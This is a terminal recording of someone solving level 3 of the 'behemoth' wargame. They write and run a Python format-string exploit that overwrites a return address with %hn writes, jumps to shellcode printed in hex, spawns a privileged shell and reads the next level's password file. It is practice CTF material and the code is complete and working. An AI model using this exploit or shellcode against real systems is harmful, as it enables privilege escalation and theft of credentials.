[36.472, "o", "$ cat /tmp/e_behemoth3.py\r\n\u001b[?25l\u001b[32;73Hi\u001b[1;1H\u001b[32;73H \u001b[1;1H\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;13H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1H\u001b[?25h\u001b[?25limport os, pty, select, struct, sys, time, fcntl, termios, tty, subprocess\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25l\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l# behemoth3: fgets(buf, 200, stdin) then printf(buf)  -> format string bug.\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l# objdump -d: buf at ebp-0xc8, saved ebp at ebp+0, return address at ebp+4.\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25l# objdump -R: printf@0x804b230 fgets@0x804b234 puts@0x804b238, no RELRO.\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25l# The shellcode was written in /tmp/b3.asm and assembled with nasm; we load the\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25l# exact bytes nasm produced (/tmp/b3.bin) instead of hand-typing them.\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25lsc = open(\"/tmp/b3.bin\", \"rb\").read()\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25lprint(\"shellcode (%d bytes): %s\" % (len(sc), sc.hex()), flush=True)\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25lassert 0 not in sc, \"fgets stops at a NUL byte\"\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25lassert b\"%\" not in sc, \"a % in the shellcode would be eaten by printf\"\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25l\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25ldef run(payload, env):\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25l    p = subprocess.Popen([\"/behemoth/behemoth3\"], stdin=subprocess.PIPE,\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25l\u001b[25Cstdout=subprocess.PIPE, env=env)\r\r\n    out, _ = p.communicate(payload + b\"\\n\")\u001b[16;44H\u001b[K\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25l    return out\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25l\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25lENV = {}\u001b[10C# empty env: the argv/buf distance below was measured this way\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25l# argv[0] sits 0x194 bytes above buf in this exact configuration; verify it\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25l# first by reading the argv pointer (arg 54) and printing *buf as a string.\u001b[22;1H\u001b[K\u001b[32;84H2\u001b[22;1H\u001b[?25h\u001b[?25lout = run(b\"%54$p\", ENV)\u001b[23;1H\u001b[K\u001b[32;84H3\u001b[23;1H\u001b[?25h\u001b[?25largv = int(out.split(b\"Welcome, \")[1].split(b\"\\n\")[0], 16)\u001b[24;1H\u001b[K\u001b[32;84H4\u001b[24;1H\u001b[?25h\u001b[?25lbuf = argv - 0x194\u001b[25;1H\u001b[K\u001b[32;84H5\u001b[25;1H\u001b[?25h\u001b[?25lprint(\"argv[0] = %#x  ->  buf = %#x\" % (argv, buf), flush=True)\u001b[26;1H\u001b[K\u001b[32;84H6\u001b[26;1H\u001b[?25h\u001b[?25lcheck = run(b\"MARK%41$s\", ENV)\u001b[27;1H\u001b[K\u001b[32;84H7\u001b[27;1H\u001b[?25h\u001b[?25lprint(\"sanity: arg41 string -> %r (our own buffer)\" % (check.split(b\"Welcome, \")[1][:20],), flush=Trr\u001b[28;1Hue)\u001b[28;4H\u001b[K\u001b[29;1H\u001b[K\u001b[32;84H8\u001b[29;1H\u001b[?25h\u001b[?25l\u001b[30;1H\u001b[K\u001b[32;84H9\u001b[30;1H\u001b[?25h\u001b[?25l# The printf varargs are the buffer itself: arg k is the dword at buf+4*(k-1).\u001b[31;1H\u001b[K\u001b[32;83H30\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# We put the two halves of the return-address slot at buf+160/164 -> args 41/42.\u001b[32;83H\u001b[K\u001b[32;83H31,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hret_slot = buf + 204\u001b[10C# buf+200 is saved ebp, buf+204 is the return address\u001b[32;83H\u001b[K\u001b[32;83H32,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H33,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# The format string must write the shellcode's address (low half, then high\u001b[32;83H\u001b[K\u001b[32;83H34,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# half) into the return slot. Its own length determines where the shellcode\u001b[32;83H\u001b[K\u001b[32;83H35,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# starts, so iterate to a fixed point.\u001b[32;83H\u001b[K\u001b[32;83H36,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hfmt = b\"\"\u001b[32;83H\u001b[K\u001b[32;83H37,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hfor _ in range(6):\u001b[32;83H\u001b[K\u001b[32;83H38,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hsc_addr = buf + len(fmt)\u001b[32;83H\u001b[K\u001b[32;83H39,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hlow = sc_addr & 0xffff\u001b[32;83H\u001b[K\u001b[32;83H40,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hhigh = (sc_addr >> 16) & 0xffff\u001b[32;83H\u001b[K\u001b[32;83H41,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hw1 = low\u001b[23C# chars printed so far (nothing yet)\u001b[32;8"]
[0.000, "o", "3H\u001b[K\u001b[32;83H42,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hw2 = (high - low) % 65536      # %hn writes the TOTAL printed, so add the rest\u001b[32;83H\u001b[K\u001b[32;83H43,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hfmt = b\"%\" + str(w1).encode() + b\"c%41$hn%\" + str(w2).encode() + b\"c%42$hn\"\u001b[32;83H\u001b[K\u001b[32;83H44,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"format: %r\" % fmt, flush=True)\u001b[32;83H\u001b[K\u001b[32;83H45,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"shellcode lands at %#x -> return slot %#x\" % (sc_addr, ret_slot), flush=True)\u001b[32;83H\u001b[K\u001b[32;83H46,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H47,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hpayload = fmt + sc\u001b[32;83H\u001b[K\u001b[32;83H48,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hpayload += b\"A\" * (160 - len(payload))\u001b[32;83H\u001b[K\u001b[32;83H49,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hpayload += struct.pack(\"<I\", ret_slot) + struct.pack(\"<I\", ret_slot + 2)\u001b[32;83H\u001b[K\u001b[32;83H50,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hassert len(payload) <= 199, len(payload)\u001b[32;83H\u001b[K\u001b[32;83H51,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hassert 0 not in payload\u001b[32;83H\u001b[K\u001b[32;83H52,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"payload %d bytes, no NUL bytes\" % len(payload), flush=True)\u001b[32;83H\u001b[K\u001b[32;83H53,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H54,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# Run behemoth3 on its own pty so the shell it spawns is interactive. The pty\u001b[32;83H\u001b[K\u001b[32;83H55,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n"]
[0.000, "o", "\u001b[1;32r\u001b[30;1H# must be in raw mode: the payload is binary, and a canonical terminal would\u001b[32;83H\u001b[K\u001b[32;83H56,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[1;1H\u001b[2M\u001b[1;32r\u001b[29;1H# eat bytes such as 0x04 (EOF) or 0x03 (SIGINT).\r\r\n\r\r\n\u001b[1m\u001b[34m~                                                                                                   \u001b[m\u001b[32;83H\u001b[K\u001b[32;83H57,1\u001b[10CBot\u001b[30;1H\u001b[?25h\u001b[?25lmaster, slave = pty.openpty()\u001b[31;1H\u001b[K\u001b[32;84H8\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Htty.setraw(slave)\u001b[32;83H\u001b[K\u001b[32;83H59,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hpid = os.fork()\u001b[32;83H\u001b[K\u001b[32;83H60,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hif pid == 0:\u001b[32;83H\u001b[K\u001b[32;83H61,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hos.close(master)\u001b[32;83H\u001b[K\u001b[32;83H62,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hos.setsid()\u001b[32;83H\u001b[K\u001b[32;83H63,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hfcntl.ioctl(slave, termios.TIOCSCTTY, 0)\u001b[32;83H\u001b[K\u001b[32;83H64,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hos.dup2(slave, 0); os.dup2(slave, 1); os.dup2(slave, 2)\u001b[32;83H\u001b[K\u001b[32;83H65,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hif slave > 2:\u001b[32;83H\u001b[K\u001b[32;83H66,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hos.close(slave)\u001b[32;83H\u001b[K\u001b[32;83H67,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hos.execve(b\"/behemoth/behemoth3\", [b\"/behemoth/behemoth3\"], ENV)\u001b[32;83H\u001b[K\u001b[32;83H68,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hos.close(slave)\u001b[32;83H\u001b[K\u001b[32;83H69,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H70,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hos.write(master, payload + b\"\\n\")\u001b[32;83H\u001b[K\u001b[32;83H71,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"FMTLAND\", flush=True)   # marker for the recorder driver\u001b[32;83H\u001b[K\u001b[32;83H72,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H73,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# The return address now points at our shellcode: it raises euid to behemoth4\u001b[32;83H\u001b[K\u001b[32;83H74,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# and execs /bin/sh, which reads this same pty. Feed it the two commands.\u001b[32;83H\u001b[K\u001b[32;83H75,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Htime.sleep(1.0)\u001b[32;83H\u001b[K\u001b[32;83H76,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1"]
[0.000, "o", "Hos.write(master, b\"id\\n\")\u001b[32;83H\u001b[K\u001b[32;83H77,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Htime.sleep(0.5)\u001b[32;83H\u001b[K\u001b[32;83H78,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[1;1H\u001b[2M\u001b[1;32r\u001b[29;1Hos.write(master, b\"cat /etc/behemoth_pass/behemoth4\\n\")\r\r\ntime.sleep(0.5)\u001b[32;83H\u001b[K\u001b[32;83H80,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hos.write(master, b\"exit\\n\")\u001b[32;83H\u001b[K\u001b[32;83H81,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H82,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hend = time.time() + 8\u001b[32;83H\u001b[K\u001b[32;83H83,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hwhile time.time() < end:\u001b[32;83H\u001b[K\u001b[32;83H84,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hr, _, _ = select.select([master], [], [], 0.2)\u001b[32;83H\u001b[K\u001b[32;83H85,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hif not r:\u001b[32;83H\u001b[K\u001b[32;83H86,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hcontinue\u001b[32;83H\u001b[K\u001b[32;83H87,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Htry:\u001b[32;83H\u001b[K\u001b[32;83H88,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hdata = os.read(master, 4096)\u001b[32;83H\u001b[K\u001b[32;83H89,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hexcept OSError:\u001b[32;83H\u001b[K\u001b[32;83H90,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hbreak\u001b[32;83H\u001b[K\u001b[32;83H91,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[1;1H\u001b[2M\u001b[1;32r\u001b[29;5Hif not data:\u001b[30;9Hbreak\u001b[32;83H\u001b[K\u001b[32;83H93,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hos.write(1, data)\u001b[32;83H\u001b[K\u001b[32;83H94,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Htry:\u001b[32;83H\u001b[K\u001b[32;83H95,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hos.waitpid(pid, 0)\u001b[32;83H\u001b[K\u001b[32;83H96,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hexcept ChildProcessError:\u001b[32;83H\u001b[K\u001b[32;83H97,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hpass\u001b[32;83H\u001b[K\u001b[32;83H98,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"\\nB3\" + \"DONE\", flush=True)\u001b[32;83H\u001b[K\u001b[32;83H99,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[32;1H\u001b[K\u001b[?25l\u001b[32;83H99,0-1\u001b[8CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[32;83H\u001b[K\u001b[32;1H:wq\r\u001b[?2004l\u001b[>4;m\"/tmp/e_behemoth3.py\" [New] 99L, 3930B written\r\u001b[23;2t\u001b[23;1t\r\r\r\n\u001b[?1004l\u001b[?2004l\u001b[?1l\u001b>\u001b[?1049l\u001b[23;0;0t\u001b[?25h\u001b[>4;m\u001b]3008;end=bf64be4b-675c-4cc0-bf15-40718009d3e6;exit=success\u001b\\\u001b]3008;start=d5862dcb-026e-4a9d-bd1c-20e0c37fa38b;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth3;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth3\u001b\\\u001b[?2004h\u001b]0;behemoth3@behemoth: ~\u0007behemoth3@behemoth:~$ $ python3 /tmp/e_behemoth3.py\r\n"]
[0.198, "o", "cat /tmp/e_behemoth3.py\r\r\n\u001b[?2004l\r\u001b]3008;start=403bf531-dab4-4817-bb83-999bdb2935b4;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth3;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth3\u001b\\"]
[0.013, "o", "import os, pty, select, struct, sys, time, fcntl, termios, tty, subprocess\r\r\n\r\r\n# behemoth3: fgets(buf, 200, stdin) then printf(buf)  -> format string bug.\r\r\n# objdump -d: buf at ebp-0xc8, saved ebp at ebp+0, return address at ebp+4.\r\r\n# objdump -R: printf@0x804b230 fgets@0x804b234 puts@0x804b238, no RELRO.\r\r\n# The shellcode was written in /tmp/b3.asm and assembled with nasm; we load the\r\r\n# exact bytes nasm produced (/tmp/b3.bin) instead of hand-typing them.\r\r\nsc = open(\"/tmp/b3.bin\", \"rb\").read()\r\r\nprint(\"shellcode (%d bytes): %s\" % (len(sc), sc.hex()), flush=True)\r\r\nassert 0 not in sc, \"fgets stops at a NUL byte\"\r\r\nassert b\"%\" not in sc, \"a % in the shellcode would be eaten by printf\"\r\r\n\r\r\ndef run(payload, env):\r\r\n    p = subprocess.Popen([\"/behemoth/behemoth3\"], stdin=subprocess.PIPE,\r\r\n                         stdout=subprocess.PIPE, env=env)\r\r\n    out, _ = p.communicate(payload + b\"\\n\")\r\r\n    return out\r\r\n\r\r\nENV = {}          # empty env: the argv/buf distance below was measured this way\r\r\n# argv[0] sits 0x194 bytes above buf in this exact configuration; verify it\r\r\n# first by reading the argv pointer (arg 54) and printing *buf as a string.\r\r\nout = run(b\"%54$p\", ENV)\r\r\nargv = int(out.split(b\"Welcome, \")[1].split(b\"\\n\")[0], 16)\r\r\nbuf = argv - 0x194\r\r\nprint(\"argv[0] = %#x  ->  buf = %#x\" % (argv, buf), flush=True)\r\r\ncheck = run(b\"MARK%41$s\", ENV)\r\r\nprint(\"sanity: arg41 string -> %r (our own buffer)\" % (check.split(b\"Welcome, \")[1][:20],), flush=True)\r\r\n\r\r\n# The printf varargs are the buffer itself: arg k is the dword at buf+4*(k-1).\r\r\n# We put the two halves of the return-address slot at buf+160/164 -> args 41/42.\r\r\nret_slot = buf + 204          # buf+200 is saved ebp, buf+204 is the return address\r\r\n\r\r\n# The format string must write the shellcode's address (low half, then high\r\r\n# half) into the return slot. Its own length determines where the shellcode\r\r\n# starts, so iterate to a fixed point.\r\r\nfmt = b\"\"\r\r\nfor _ in range(6):\r\r\n    sc_addr = buf + len(fmt)\r\r\n    low = sc_addr & 0xffff\r\r\n    high = (sc_addr >> 16) & 0xffff\r\r\n    w1 = low                       # chars printed so far (nothing yet)\r\r\n    w2 = (high - low) % 65536      # %hn writes the TOTAL printed, so add the rest\r\r\n    fmt = b\"%\" + str(w1).encode() + b\"c%41$hn%\" + str(w2).encode() + b\"c%42$hn\"\r\r\nprint(\"format: %r\" % fmt, flush=True)\r\r\nprint(\"shellcode lands at %#x -> return slot %#x\" % (sc_addr, ret_slot), flush=True)\r\r\n\r\r\npayload = fmt + sc\r\r\npayload += b\"A\" * (160 - len(payload))\r\r\npayload += struct.pack(\"<I\", ret_slot) + struct.pack(\"<I\", ret_slot + 2)\r\r\nassert len(payload) <= 199, len(payload)\r\r\nassert 0 not in payload\r\r\nprint(\"payload %d bytes, no NUL bytes\" % len(payload), flush=True)\r\r\n\r\r\n# Run behemoth3 on its own pty so the shell it spawns is interactive. The pty\r\r\n# must be in raw mode: the payload is binary, and a canonical terminal would\r\r\n# eat bytes such as 0x04 (EOF) or 0x03 (SIGINT).\r\r\nmaster, slave = pty.openpty()\r\r\ntty.setraw(slave)\r\r\npid = os.fork()\r\r\nif pid == 0:\r\r\n    os.close(master)\r\r\n    os.setsid()\r\r\n    fcntl.ioctl(slave, termios.TIOCSCTTY, 0)\r\r\n    os.dup2(slave, 0); os.dup2(slave, 1); os.dup2(slave, 2)\r\r\n    if slave > 2:\r\r\n        os.close(slave)\r\r\n    os.execve(b\"/behemoth/behemoth3\", [b\"/behemoth/behemoth3\"], ENV)\r\r\nos.close(slave)\r\r\n\r\r\nos.write(master, payload + b\"\\n\")\r\r\nprint(\"FMTLAND\", flush=True)   # marker for the recorder driver\r\r\n\r\r\n# The return address now points at our shellcode: it raises euid to behemoth4\r\r\n# and execs /bin/sh, which reads this same pty. Feed it the two commands.\r\r\ntime.sleep(1.0)\r\r\nos.write(master, b\"id\\n\")\r\r\ntime.sleep(0.5)\r\r\nos.write(master, b\"cat /etc/behemoth_pass/behemoth4\\n\")\r\r\ntime.sleep(0.5)\r\r\nos.write(master, b\"exit\\n\")\r\r\n\r\r\nend = time.time() + 8\r\r\nwhile time.time() < end:\r\r\n    r, _, _ = select.select([master], [], [], 0.2)\r\r\n    if not r:\r\r\n        continue\r\r\n    try:\r\r\n        data = os.read(master, 4096)\r\r\n    except OSError:\r\r\n        break\r\r\n    if not data:\r\r\n        break\r\r\n    os.write(1, data)\r\r\ntry:\r\r\n    os.waitpid(pid, 0)\r\r\nexcept ChildProcessError:\r\r\n    pass\r\r\nprint(\""]
[0.000, "o", "\\nB3\" + \"DONE\", flush=True)\r\r\n\r\r\n"]
[0.022, "o", "\u001b]3008;end=403bf531-dab4-4817-bb83-999bdb2935b4;exit=success\u001b\\\u001b]3008;start=d5862dcb-026e-4a9d-bd1c-20e0c37fa38b;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth3;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth3\u001b\\\u001b[?2004h\u001b]0;behemoth3@behemoth: ~\u0007behemoth3@behemoth:~$ python3 /tmp/e_behemoth3.py\r\r\n\u001b[?2004l\r\u001b]3008;start=02201c53-cec5-4480-8986-fafa2d8d2191;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth3;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth3\u001b\\"]
[0.000, "o", "shellcode (78 bytes): 31c0506850574e2189e131db4331d2b20431c0b004cd8031c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f7368682f62696e89e3505389e131d2b00bcd80\r\r\nargv[0] = 0xffffdee4  ->  buf = 0xffffdd50\r\r\nsanity: arg41 string -> b'MARK(null)\\n\\naaaand g' (our own buffer)\r\r\nformat: b'%56681c%41$hn%8854c%42$hn'\r\r\nshellcode lands at 0xffffdd69 -> return slot 0xffffde1c\r\r\npayload 168 bytes, no NUL bytes\r\r\nFMTLAND\r\r\n"]
[2.025, "o", "Identify yourself: Welcome,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       